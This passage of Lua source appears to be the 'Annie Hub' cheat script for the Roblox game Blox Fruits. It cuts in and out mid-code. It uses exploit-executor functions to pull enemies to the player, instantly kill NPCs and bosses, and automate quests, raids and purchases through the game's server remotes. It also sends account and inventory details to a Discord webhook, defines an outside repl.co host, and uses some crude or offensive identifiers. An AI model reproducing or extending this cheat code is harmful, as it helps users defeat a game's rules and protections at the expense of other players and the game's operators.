           if v and v.Name == BringName and not v:FindFirstChild(".gg/annie209") and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 and (v.HumanoidRootPart.Position - BringCFrame.Position).Magnitude < 250 and (v.HumanoidRootPart.Position - BringCFrame.Position).Magnitude > 30 then
                Instance.new("Part", v).Name = ".gg/annie209"
                v.PrimaryPart.CFrame = BringCFrame
                v.Humanoid.JumpPower = 0
            		v.Humanoid.WalkSpeed = 0
                v.HumanoidRootPart.CanCollide = false
            		sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
            		v.Humanoid:ChangeState(14)
            	
            end
        end
end


            function eatfruit(name)
               pcall(function ()
               EquipWeaponName(name)
               if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getAwakenedAbilities") and game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getAwakenedAbilities")["Z"]["Awakened"] and c().Main["Ingoring Eat Another Fruit If Current Fruit Is Awakened"] then noti"Lock Awakened Fruit" game.Players.LocalPlayer.Character.Humanoid.Health = -1 return end
               if not workspace.Characters[lp.Name][name].EatRemote:InvokeServer() then
                  game.Players.LocalPlayer.Character.Humanoid.Health = -1
               end
               end)
            end
            function deobietsettengi()
               if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BartiloQuestProgress","Bartilo" ) == 1 then
                  if not CheckBoss("Jeremy") then
                     return false
                  else
                     return true
                  end
               else
                  return true
               end
            end
            function getMobPirateRaid()
              if not CheckSea(3) then return end
              for i, v in pairs(game.ReplicatedStorage:GetChildren()) do 
                if
                     not string.find(v.Name, "Brigade") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 and
                     v:FindFirstChild("HumanoidRootPart") and
                     (v.HumanoidRootPart.Position -
                     Vector3.new(-5543.5327148438, 313.80062866211, -2964.2585449219)).magnitude <= 3000 and
                     not string.find(v.Name, "Boss") and
                     not string.find(v.Name, "Friend")
                     then 
                to(CFrame.new(Vector3.new(-5543.5327148438, 313.80062866211, -2964.2585449219))) 
                     end 
              end 
                   
              if checkNotify"pirates are raiding" then 
                to(CFrame.new(Vector3.new(-5543.5327148438, 313.80062866211, -2964.2585449219))) 
                return
                end
               for r, v in pairs(workspace.Enemies:GetChildren()) do 
                 
                     if
                     not string.find(v.Name, "Brigade") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 and
                     v:FindFirstChild("HumanoidRootPart") and
                     (v.HumanoidRootPart.Position -
                     Vector3.new(-5543.5327148438, 313.80062866211, -2964.2585449219)).magnitude <= 3000 and
                     not string.find(v.Name, "Boss") and
                     not string.find(v.Name, "Friend")
                     then
                       
                        return v
                     end
                 
                  
                  
                  
               end
               for r, v in pairs(game.ReplicatedStorage:GetChildren()) do
               
                  spawn(
                  function()
                     if
                     not string.find(v.Name, "Brigade") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 and
                     v:FindFirstChild("HumanoidRootPart") and
                     (v.HumanoidRootPart.Position -
                     Vector3.new(-5543.5327148438, 313.80062866211, -2964.2585449219)).magnitude <= 3000 and
                     not string.find(v.Name, "Boss") and
                     not string.find(v.Name, "Friend")
                     then
                        return v
                     end
                  end
                  
                  )
               end 
               
             
            end 
        

function UpV3()
wait(2)
    local args = {[1] = "Wenlocktoad", [2] = "3"}
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    wait(2)
end


           

getgenv().a = false



function out(a, b) 
  if a then b() end 
end 
out(getgenv().a , LPH_CRASH)


getgenv ().a = {
  host = "https://cringeman.gggggjdksksk.repl.co"
}

function parserPath(path) 
  return getgenv().a.host .. "/"..path
end
      
     

            function down(use) -- Send key to client
               game:service("VirtualInputManager"):SendKeyEvent(true, use, false, game)
               task.wait()
               game:service("VirtualInputManager"):SendKeyEvent(false, use, false, game)
            end

            function equip(tooltip)
               local player = game.Players.LocalPlayer
               local character = player.Character or player.CharacterAdded:Wait()
               for _, item in pairs(player.Backpack:GetChildren()) do
                  if item:IsA("Tool") and item.ToolTip == tooltip then
                     local humanoid = character:FindFirstChildOfClass("Humanoid")
                     if humanoid and not humanoid:IsDescendantOf(item) then
                        game.Players.LocalPlayer.Character.Humanoid:EquipTool(item)
                        return item
                     end
                  end
               end

               return false
            end
            -- 
            function gmlp()
               if MobLevel1OrMobLevel2() then
                  
                  return (MobLevel1OrMobLevel2():gsub(" %pLv. %d+%p", "")):gsub(" ", "")
               end
            end
            function fruitspawn()
               for i, v in pairs(game.Workspace:GetChildren()) do
                  if string.find(v.Name, "Fruit") and v:FindFirstChild"Handle" then
                     for b, c in pairs(v:GetChildren()) do
                        if string.find(c.Name, "Mesh") then
                           if (v.Handle.CFrame.Position-c.CFrame.Position).Magnitude < 5 then
                              return v
                           end
                        end
                     end
                  end
               end
            end


    
            function storefruit()
              if AutoRaid then return end 
repeat wait() until game:GetService("Players").LocalPlayer:FindFirstChild"Data"
      local sex = game:GetService("Players").LocalPlayer:FindFirstChild"Data".DevilFruit.Value
               for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do

                  if string.find(v.Name, "Fruit") then

                        local name = v.Name
                     for i2, v2 in pairs(fruit) do

                        if string.find(string.lower(v2), string.gsub(string.lower(name), " fruit", "")) then


                           if raidfruit and ( name == raidfruit or string.find(name, raidfruit)) then return end
                           game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StoreFruit",v2, v)
                           if v and checkNotify"You can only store" then
                        
                          
                              -- noti(getFruitTier(name), getFruitTier(game.Players.LocalPlayer.Data.DevilFruit))
                              if v and v.Name and  game.Players.LocalPlayer.Data.DevilFruit.Value and getFruitTier(v.Name or name)
                              >= getFruitTier(NameDf()) and c().Fruit["Eat While Cant Store"] then
noti"Eat Fruit"
                                 eatfruit(v.Name)
                              elseif  c().Fruit["Misc / Auto Raid If Can't Store"] and getPlayerFragments() < c().Fruit["Fragments Limit By Fruit Loot Raid"] and getPlayerLevel() > 1100 and not CheckSea(1) then 
                                
                                 
                                 AutoRaid = true
                                 PullFruit = false
                              else
noti"Shit"
                                 game.Players.LocalPlayer.Character.Humanoid.Health=0
                              end
                              return;
                           else
                              noti("stored")
                           end
                        end
                     end
                  end
               end
              


repeat wait() until game:GetService("Players").LocalPlayer:FindFirstChild"Data"
      local sex = game:GetService("Players").LocalPlayer:FindFirstChild"Data".DevilFruit.Value
               for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do

                  if string.find(v.Name, "Fruit") then

                        local name = v.Name
                     for i2, v2 in pairs(fruit) do

                        if string.find(string.lower(v2), string.gsub(string.lower(name), " fruit", "")) then


                           if raidfruit and ( name == raidfruit or string.find(name, raidfruit)) then return end
                           game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StoreFruit",v2, v)
                           if v and checkNotify"You can only store" then
                        
                          
                              -- noti(getFruitTier(name), getFruitTier(game.Players.LocalPlayer.Data.DevilFruit))
                              if v and v.Name and  game.Players.LocalPlayer.Data.DevilFruit.Value and getFruitTier(v.Name or name)
                              >= getFruitTier(NameDf()) and c().Fruit["Eat While Cant Store"] then
noti"Eat Fruit"
                                 eatfruit(v.Name)
                              elseif  c().Fruit["Misc / Auto Raid If Can't Store"] and getPlayerFragments() < c().Fruit["Fragments Limit By Fruit Loot Raid"] and getPlayerLevel() > 1100 and not CheckSea(1) then 
                            
                                 
                                 AutoRaid = true
                                 PullFruit = false
                              else
noti"Shit"
                                 game.Players.LocalPlayer.Character.Humanoid.Health=0
                              end
                              return;
                           else
                              noti("stored")
                           end
                        end
                     end
                  end
               end

          end
function cdkstuff1() 
  
     
     if checkMelee"Godhuman" and eltrul["Godhuman"] > 399 and not checkitem"Cursed Dual Katana" then
       
       local Main = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","Progress") 
      local a, b = checkitem"Yama" 
      local cl, d = checkitem"Tushita" 
   
      
          if a and a.Mastery > 350 then
            if cl and cl.Mastery > 350 then
           if Main.Good == -1 then
             game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Good") 
             
             pcall(to(getmon"Mythological Pirate".HumanoidRootPart.CFrame) or getMobLoadPos"Mythological Pirate".CFrame)
             return true
           elseif  Main.Evil == -1 then 
             game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
              for i, v in pairs(workspace.NPCs:GetChildren()) do 
                if v.Name == "Luxury Boat Dealer" then 
                  game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","BoatQuest",v) 
                end 
              end 
             return true
           elseif  Main.Evil == 0 then
             game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
               for i, v in pairs(workspace.Enemies:GetChildren()) do 
                 if v:FindFirstChild("HazeESP") then 
                   BringMob(v)
                   click = true
                   repeat wait () 
                     pcall(function()
                     to(v.HumanoidRootPart.CFrame*CFrame.new(5,35,8)) 
                     stuff(v)
                   end) 
                   until not skidymf(v) 
                   click = false
                 end 
               end 
            return true
           elseif  Main.Good == 0 then 
             game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Good")
            return false
           elseif  Main.Evil == 1 then  
             game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
             if CheckBoss"Soul Reaper" then
               game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
               
                 local b = CheckBoss"Soul Reaper"
                 repeat wait()
                 to(b.HumanoidRootPart.CFrame)
                 until game:GetService("Workspace").Map:FindFirstChild("HellDimension") 
                 wait(2) 
                 for i3,v3 in pairs(game:GetService("Workspace").Map.HellDimension:GetChildren()) do 
                   
                                                            if string.find(v3.Name, 'Torch') and v3:FindFirstChild("ProximityPrompt") then
                                                                if v3.ProximityPrompt.Enabled == true then
                                                                    repeat wait()
                                                                    if (v3.Position-plr.Character.HumanoidRootPart.Position).Magnitude <= 5 then 
                                                                        fireproximityprompt(v3.ProximityPrompt)
                                                                    else
                                                                       to(v3.CFrame)
                                                                    end
                                                                   until game:GetService("Workspace").Enemies:FindFirstChild('Cursed Skeleton [Lv. 2200]') or v3.ProximityPrompt.Enabled == false
                                                                    
                                                                end
                                                            end
                 end 
                                                      repeat wait()
                                                        for i, v in pairs(getsortedmon()) do 
                                                          pcall(function()
                                                        if string.find(v.Name, "Cursed Skeleton") or string.find(v.Name, "Hell") then 
                                                          v.HumanoidRootPart.CanCollide = false
                           sethiddenproperty(
                           game:GetService("Players").LocalPlayer,
                           "SimulationRadius",
                           math.huge)
                           v.Humanoid.Health = 0
                           v:BreakJoints()
                           end
                                                      end )
                                                      
                                                      end
                                                      until not game.Workspace.Enemies:FindFirstChild"Hell's Messenger [Lv. 2200] [Boss]"
                                                      wait(.2) 
                                                      to(game:GetService("Workspace").Map.HellDimension.Exit.CFrame)
             end 
           end
          elseif  Main.Good == 1 then 
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Good")
             if CheckBoss"Cake Queen" then 
               
               local aG = CheckBoss"Cake Queen"
               repeat wait() 
                 pcall(function() 
                   to(getKillVector3(aG.HumanoidRootPart.CFrame))
                   stuff () 
                   click = true 
                 end) 
               until not skidymf(aG) or game:GetService("Workspace").Map:FindFirstChild("HeavenlyDimension")
               wait(2) 
               for i, v in pairs(game:GetService("Workspace").Map:FindFirstChild("HeavenlyDimension")) do 
                   
                                                            if string.find(v3.Name, 'Torch') and v3:FindFirstChild("ProximityPrompt") then
                                                                if v3.ProximityPrompt.Enabled == true then
                                                                    repeat wait()
                                                                    if (v3.Position-plr.Character.HumanoidRootPart.Position).Magnitude <= 5 then 
                                                                        fireproximityprompt(v3.ProximityPrompt)
                                                                    else
                                                                       to(v3.CFrame)
                                                                    end
                                                                   until game:GetService("Workspace").Enemies:FindFirstChild("Heaven's Guardian") or v3.ProximityPrompt.Enabled == false
                                       repeat wait()
                                                        for i, v in pairs(getsortedmon()) do 
                                                          pcall(function()
                                                        if string.find(v.Name, "Cursed Skeleton") or string.find(v.Name, "Heaven") then 
                                                          v.HumanoidRootPart.CanCollide = false
                           sethiddenproperty(
                           game:GetService("Players").LocalPlayer,
                           "SimulationRadius",
                           math.huge)
                           v.Humanoid.Health = 0
                           v:BreakJoints()
                           end
                                                      end )
                                                      
                                                      end
                                           until not game.Workspace.Enemies:FindFirstChild"Heaven's Guardian" 
                   
                                            wait(.2) 
                                                      to(game:GetService("Workspace").Map.HeavenlyDimension.Exit.CFrame)
                                                                end 
                                                                end 
                 end
             elseif CheckMaterialCount"Alucard Fragment" == 6 then
                 return {
                   0,
                   0,
                   "Done"
                 }
               
               end
               else 
                 if a.Mastery > 350 and not 
                 CheckBoss("rip_indra True Form") and c()["Main"]["Misc / Automatically Hop For Rip Indra"] then 
                  
                   hophophop = true
                   return
                 end 
               
                 set1"Waiting For Tushita" 
                 if not checkitem2"Tushita" and checkitem"Tushita" then
                 set1"Waiting For Tushita Hit 300 Mastery" 
                 forcewp = "Sword"
                 local args = {
    [1] = "LoadItem",
    [2] = "Tushita"
}

game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))

                 end
        end
             else
             forcewp = "Sword" 
             set1"Waiting For  Yama"
             if not checkitem2"Yama" and checkitem"Yama" then
             set1"Waiting For Yama Hit 300 Mastery"
             local args = {
    [1] = "LoadItem",
    [2] = "Yama"
}

game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
end 
           end
     end
     
end
      
           task.spawn(function()
            RedeemAllCodesX2()
            end)
            function noti2(msg)
               if msg ~= oldmsg then
                  -- noti(msg, 5)
                  WeaponMsg = msg
                  oldmsg = msg
               end
            end
            
            function noti(b, d)
              
               Notify(
               {
                  Description = b,
                  Title = "Annie • notifications",
                  Duration = d or 5
               }
               )
            end
            local blocked = {}

            function getElite()
               for v746, v9471 in pairs(getsortedmon()) do
                  if skidymf(v9471) and table.find(elite, v9471.Name) then
                     return v9471
                  end
               end
               for v746, v9471 in pairs(game.ReplicatedStorage:GetChildren()) do
                  if skidymf(v9471) and table.find(elite, v9471.Name) then
                     return v9471
                  end
               end
            end

            eltrul = {}

         
            allmelee = " > "
            for v09, v10 in pairs(meleetable2) do
              local cu = GetAndCheckMeleeMastery(v10)
               eltrul[v10] = cu or 0
               print(v09,v10,cu)
               allmelee = allmelee.." "..tostring(v10).."("..tostring(GetAndCheckMeleeMastery(v10))..")"
               pcall(function () if cu == 0 then return end vclui[v10]:SetText("[+] : "..v10) end)
            end
            
            CFrameQuest()
            wait()
            
            PullFruit = false
            delaychecktime = 0
          function checkdelay(task, oldt) 
            delaychecktime = delaychecktime+1
            
           
    
           delaytime = tick()
            
          end
              function AwakeFruit()

        local cI = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Awakener", "Check")

        if not cI or cI == 0 or cI == 1 then
            return
        end
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Awakener", "Awaken")
    end
      
      function getAwakeningSkills() 
        local awakened = ""
        if not game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getAwakenedAbilities") then 
          return "This Fruit Cant Awaken"
          end
        for i, v in pairs(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getAwakenedAbilities")) do 
           awakened = awakened.." ["..i.."]: "..tostring(v.Awakened)..", " 
        end 
        return awakened
      end 
      
      function getAwakeningSkills2() 
        
        if not game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getAwakenedAbilities") then 
          return {["This Fruit Cant Awaken"] = false}
        end
        local ban = {}
        for i, v in pairs(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getAwakenedAbilities")) do 
            ban[tostring(i)] = v.Awakened or false
        end 
        return ban
      end 
   function getChildPorn() 
     local bucac = {}
     for i, v in pairs(inv) do 
       if tonumber(v.Rarity) > 2 then 
         table.insert(bucac, v.Name)
       end 
     end 
     return bucac 
   end 
   noti("Loaded ("..math.floor(tick()-tickcac).."ms delay)")
if c().Misc.Webhook.Enable then 
  warn("ok")
  spawn(function () 
    fe = true
    while (fe and wait()) or task.wait(c().Misc.Webhook["Webhook Setting"].Delay) do 
      warn("send")
      fe = false
      if c().Misc.Webhook["Webhook Setting"]["Account Status"] then 
        noti("Post Account Status To Webhook...")
        warn("post")
        local inventory = {
          Sword = " > ",
          Gun = " > ",
          Wear = " > ",
          ["Blox Fruit"] = " > ",
          Material = " > ",
          Other = " > "
        }
        for k, v in pairs(inv) do 
         v.Type = v.Type or "Other"
         
          print(v.Type)
          if string.len(inventory[v.Type]) > 1000 then inventory[v.Type]=tostring(inventory[v.Type].."..." )
            else
          inventory[v.Type] = tostring(inventory[v.Type]..v.Name.."("..(v.Mastery or v.Count or "?")..")("..tostring(rarity[v.Rarity] or "null")..") ")
          end
        --setclipboard(tostring(game:GetService"HttpService":JSONEncode(inventory)))
        end
        allmelee = " > "
        for l, j in pairs(eltrul) do 
          if j > 0 then 
            allmelee = allmelee.." "..tostring(l).."("..tostring(j)..")," 
          end 
        end
       
        ditmemememememmeme = {}
        ditmemememememmeme["embeds"] = {{
          ["title"] = "Annie Hub",
          ["url"] = "https://discord.gg/annie209",
          ["description"] = "uwu",
          ["color"] = 14177041,
         
          ["author"] = {
            ["name"] = "uwu",
            ["icon_url"] = "https://e7.pngegg.com/pngimages/128/635/png-clipart-sakura-tree-cherry-blossom-cherry-branch-color-thumbnail.png"
          },
          ["fields"] = {
            {
              ["name"] = "General",
              ["value"] = tostring("```Name: "..game.Players.LocalPlayer.Name.."\nLevel: "..getPlayerLevel().."\nBeli: "..getPlayerBeli().."\nFragments: "..getPlayerFragments().."\nRace: "..whatismyrace().."\nDevil Fruit: "..tostring(NameDf()).."```"),
              ["inline"] = true
            },
          
            {
              ["name"] = "Melee",
              ["value"] = "```"..tostring(allmelee or "Error").."```",
              ["inline"] = true
            },
             {
              ["name"] = "Awakening Skills",
              ["value"] = "```"..tostring(getAwakeningSkills()).."```",
              ["inline"] = true
            },
            
            {
              ["name"] = "Sword",
              ["value"] = "```"..tostring(inventory["Sword"]or "Error").."```",
              ["inline"] = true
            },
            {
              ["name"] = "Gun",
              ["value"] = "```"..tostring(inventory["Gun"] or "Error").."```",
              ["inline"] = true
            },
            {
              ["name"] = "Accessory",
              ["value"] = "```"..tostring(inventory["Wear"] or "Error").."```",
              ["inline"] = true
            },
            {
              ["name"] = "Fruit",
              ["value"] = "```"..tostring(inventory["Blox Fruit"] or "Error").."```",
              ["inline"] = true
            },
            {
              ["name"] = "Material",
              ["value"] = "```"..tostring(inventory["Material"] or "Error").."```",
              ["inline"] = true
            },
            {
              ["name"] = "Others",
              ["value"] = "```"..tostring(inventory["Other"] or "Error").."```",
              ["inline"] = true
            },
            {
              ["name"] = "Unlocked",
              ["value"] = "```"..tostring("Race V2: "..tostring(moctui(2)).."\nRace V3: "..tostring(moctui(3)).."\nBartilo: "..tostring(BartiloProgress == 3).."\nSwan: "..tostring( (uable or {FlamingoAccess=0})["FlamingoAccess"] or false)).."```",
              ["inline"] = true
            },
           
           
             {
               ["name"] = "Script Status",
               ["value"] = "```"..(m1 or "none").."\n "..(m2 or "none").."```",
               ["inline"] = true
             },
          },
          ["footer"] = {
             ["text"] = "Annie Kaitun / https://discord.com/invite/annie209 / "..disp_time(esltime) or "",
           },
        
           ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
           }}
         
      PostWebhook(c().Misc.Webhook.Url, ditmemememememmeme)
      
      end
end end) 
end

      
          spawn(function ()
            while task.wait(.1) do 
              pcall(function()
                textframefffff.Text = "Hold P To Remove Black Screen \n Player Level: "..getPlayerLevel()
                if game.Players.LocalPlayer.Character.Humanoid.Sit then
                game.Players.LocalPlayer.Character.Humanoid.Health = 0
                  end
              end)
              pcall(function () 
                if c().Main["Misc / Automatically Purchase Legendary Sword"] then
                local args = {

                            [1] = "LegendarySwordDealer",

                            [2] = tostring (math.random(1,3))
                        }
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                end 
                      if c().Main["Misc / Automatically Purchase Haki Color"] then 
                        local args = {

					[1] = "ColorsDealer",

					[2] = "2"
				}
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                        end 
                end)
              pcall(function() 
                aD = CheckIsRaiding() 
              end) 
              pcall(function() 
                cockboss = CheckSea(3) and CheckBoss(DoughBoss[1]) or CheckBoss(DoughBoss[2])
              end) 
              pcall(function() 
                bA = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyElectricClaw", true)
                
              end) 
              pcall(function() 
                specb = getSpeficalBoss()
              end) 
              pcall(function() 
                tushitareq = CheckSea(3) and not checkitem"Tushita" and CheckBoss"rip_indra True Form" 
              end) 
              
              pcall(function() 
                checkyamareq = CheckSea(3) and not checkitem"Yama" and game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EliteHunter","Progress") >= 30 
              end) 
              
              pcall(function() 
                buddyreq = CheckSea(3) and not checkitem"Buddy Sword" and CheckBoss"Cake Queen"  
              end) 
              
              pcall(function() 
               Canvanderreq = CheckSea(3) and CheckBoss"Beautiful Pirate" and not checkitem"Canvander" 
              end) 
              
              pcall(function() 
                 hakicol = CheckSea(3) and game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("HornedMan","Bet") == nil 
              end) 
              
              pcall(function() 
                ispirateraid = getMobPirateRaid()
              end) 
              
              pcall(function() 
                tushitareq2 = CheckSea(3) and not checkitem"Tushita"and not game:GetService("Workspace").Map.Turtle:FindFirstChild("TushitaGate") and CheckBoss"Longma" 
              end) 
              
              pcall(function() 
                librarydoor = CheckSea(2) and checkitem"Library Key" and game:GetService("Workspace").Map.IceCastle.Hall.LibraryDoor:FindFirstChild"PhoeyuDoor" and game:GetService("Workspace").Map.IceCastle.Hall.LibraryDoor.PhoeyuDoor.Transparency == 0  
              end) 
              
              pcall(function() 
                 rengokustat = CheckSea(2) and checkitem"Hidden Key" and not checkitem"Rengoku"
              end) 
              
              pcall(function() 
                 factoryexists = CheckSea(2) and
                 
                 
                 (getmon("Core") or CheckBoss"Core")
              end) 
              
              pcall(function() 
                BartiloProgress = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BartiloQuestProgress","Bartilo" )
              end) 
              
              pcall(function() 
                zqp = game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("ZQuestProgress", "Check")
              end) 
              
              pcall(function() 
                uable = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GetUnlockables") 
               uable = uable or {}
              end) 
              
              pcall(function() 
                waterkeystuff = CheckSea(2) and not cls_7 and CheckBoss"Tide Keeper"
              end) 
              
              pcall(function() 
                rengokustat3 = CheckSea(2) and (not checkitem"Rengoku" or (game:GetService("Workspace").Map.IceCastle.Hall.LibraryDoor:FindFirstChild"PhoeyuDoor" and game:GetService("Workspace").Map.IceCastle.Hall.LibraryDoor:FindFirstChild"PhoeyuDoor".Transparency == 0))
                and CheckBoss"Awakened Ice Admiral" 
                
              end) 
              
              pcall(function() 
                cls_1 =  not CheckSea(1) and (( aD or AutoRaid ) and (game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaidsNpc", "Select", (SelectRaid or getraidchip())) == 1 or (PullFruit and loadfruit(getRaidFruit()) and game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaidsNpc", "Select", (SelectRaid or getraidchip())) == 1) or CheckIsRaiding()))or checkitem"Special Microchip" 
              end) 
              
              spawn(function() 
                cls_2 = CheckSea(3) and checkitem"Red Key" and game:GetService("Workspace").Map.CakeLoaf:FindFirstChild("RedDoor") 
              end) 
              
            
          
              pcall(function()
                cls_3 = checkitem"Hallow Essence" 
                end)
              pcall(function()
                cls_4 = CheckSea(2) and getPlayerLevel() > 849 and BartiloProgress and BartiloProgress~= 3 and deobietsettengi() and c().Main["Quest / Bartilo"]
                end)
              pcall(function()
                cls_5 = getElite() 
                end)
              pcall(function()
                cls_6 =  (workspace:FindFirstChild"Flower2" and workspace.Flower2.Transparency ~= 1 and not checkitem"Flower 2")
                end)
              pcall(function()
                cls_7 = CheckWaterKey()
                end)
           
            end 
          end)
          
          spawn(function ()
            while task.wait() do
              
             oti = tick()
           
              oldtimetime = os.time() 
              ayuu, miii = xpcall(function ()
              spawn(function()
                  pcall(function () 
                if CheckMaterialCount("Bone") > 50 then 
                   game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 1) 
                   end
                    end)
              reach = os.time()
             
               updatetime()
            
             end)
--           --    warn(PullFruit, AutoRaid, CheckIsRaiding())
         delaytime = tick() 
             
               if getgenv().ForceStop  then 
                  
             --   elseif  CheckSea(3) and cdkstuff1()  then 
                 elseif  cls_1 then
                   set"Raiding"
                   noti"Raid"
                   if CheckIsRaiding()  then
                     rson = "Continue Raid" 
                   end 
                   if AutoRaid  then 
                     rson = "Request Raid" 
                   end
                               --     noti("Auto Raid / "..getdelaytime.." / "..rson)
                    if CheckIsRaiding()  then
                     AutoRaid = false
                     PullFruit = false
                  repeat wait()
                        pcall(function()
                      for i, v in pairs(getsortedmon()) do 
                        to(getNextIsland().CFrame*CFrame.new(math.random(0,50),100,math.random(0,50)))
                             v.HumanoidRootPart.CanCollide = false
                           sethiddenproperty(
                             game:GetService("Players").LocalPlayer,
                             "SimulationRadius",
                             math.huge)
                             v.Humanoid.Health = 0
                             v:BreakJoints()
                      end 
                        end) 
          
                      until not CheckIsRaiding()
                else
                if CheckSea(3)  then
                             fireclickdetector(Workspace.Map["Boat Castle"].RaidSummon2.Button.Main.ClickDetector)
  
                          elseif  CheckSea(2)  then
                             fireclickdetector(Workspace.Map.CircleIsland.RaidSummon2.Button.Main.ClickDetector)
                          else
                           lp:Kick("Bro What?")
                          end
                        check179 = os.time()
                        repeat wait() pcall(function ()sexroblox:Cancel()end) to(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame) print("?") until checkNotify("GO") or not game.Players.LocalPlayer.Character:FindFirstChild"Head" or os.time()-check179 > 10
                        
                   end 
                  AwakeFruit()
                elseif  cls_2 then 
                  EquipWeaponName"Red Key"
                  to(CFrame.new(-2681.97998, 64.3921585, -12853.7363, 0.149007782, -1.87902192e-08, 0.98883605, 3.60619588e-08, 1, 1.35681812e-08, -0.98883605, 3.36376011e-08, 0.149007782)) 
                  local args = {
 									[1] = "CakeScientist",
 									[2] = "Check"
 								}
 
 								game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))    
 								local args = {
 									[1] = "RaidsNpc",
 									[2] = "Check"
 								}
 
 								game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))     
 								
                elseif  CheckSea(3) and (cockboss)  then 
                  local ayuyu = CheckBoss(DoughBoss[1]) or CheckBoss(DoughBoss[2]) 
                  click = true
                  repeat wait() 
                    pcall(function ()
                      to(ayuyu.HumanoidRootPart.CFrame*CFrame.new(5,35,8))
                      stuff(ayuyu)
                    end) 
                  until not skidymf(ayuyu)
                  click = false
                  
                elseif  CheckSea(3) and bA == 4  then 
                  game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyElectricClaw", "Start") 
                  wait() 
                  request(Vector3.new(-12463.8740234375, 374.9144592285156, -7523.77392578125))
            
                     
                elseif  cls_3 then 
                   to(game:GetService("Workspace").Map["Haunted Castle"].Summoner.Detection.CFrame)
                   elseif   CheckSea(3) and CheckBoss"Soul Reaper"  then
                      local ter = CheckBoss"Soul Reaper"
                     
                      repeat wait()
                         pcall(function ()
                         to(ter.HumanoidRootPart.CFrame*CFrame.new(3,40,7))
                         click = true
                         stuff(ter)
                         end)
                      until not skidymf(ter)







  






                   elseif   CheckSea(3) and buddyreq  then
                      local ter = CheckBoss"Cake Queen"
                     
                      repeat wait()
                         pcall(function ()
                         to(getKillVector3(ter.HumanoidRootPart.CFrame))
                         click = true
                         stuff(ter)
                         end)
                      until not skidymf(ter)
 
                   elseif  CheckSea(3) and checkyamareq  then
                      set("Get Yama")
                      repeat wait()
                         fireclickdetector(game:GetService("Workspace").Map.Waterfall.SealedKatana.Handle.ClickDetector)
                      until checkitem"Yama"
 
                   elseif  CheckSea(3) and tushitareq  then
                      
                      if not EquipWeaponName"Holy Torch"  then
                         to(CFrame.new(-10752, 417, -9366))
                      else
                         repeat wait()
                            to(CFrame.new(-10752.7695, 412.229523, -9366.36328))
                            wait(.2)
                            to(CFrame.new(-11673.4111, 331.749023, -9474.34668))
                            wait(.2)
                            to(CFrame.new(-12133.3389, 519.47522, -10653.1904))
                            wait(.2)
                            to(CFrame.new(-13336.5, 485.280396, -6983.35254, 0.912677109))
                            wait(.2)
                            to(CFrame.new(-13487.4131, 334.84840, -7926.34863))
                            wait(.4)
                         until not checkitem"Holy Torch"
                      end
     elseif   specb  then
                   if CheckIsRaiding()  then
                      game.Players.LocalPlayer.Character.Humanoid.Health = -2
                   else  
                      local ngbthemcac = getSpeficalBoss()
                      
                      if ngbthemcac  then
                         repeat wait ()
                            pcall(function ()
                            to(getKillVector3(ngbthemcac.HumanoidRootPart.CFrame))
                            stuff(ngbthemcac)
                            click = true
                            end)
                         until not skidymf(ngbthemcac)
                      end
                   end
                
                   elseif  CheckSea(3) and tushitareq2  then
                      local eltrulngum = CheckBoss"Longma"
                      set("Farming "..eltrulngum.Name.." [Tushita]")
                      repeat wait()
                         pcall(function()
                         to(getKillVector3(eltrulngum.HumanoidRootPart.CFrame))
                         stuff(eltrulngum)
                         click = true
                         end)
                      until not skidymf(eltrulngum)
                      click= false
                   

                   elseif   CheckSea(3) and ispirateraid  then
                     check180 = os.time()
                  repeat wait()
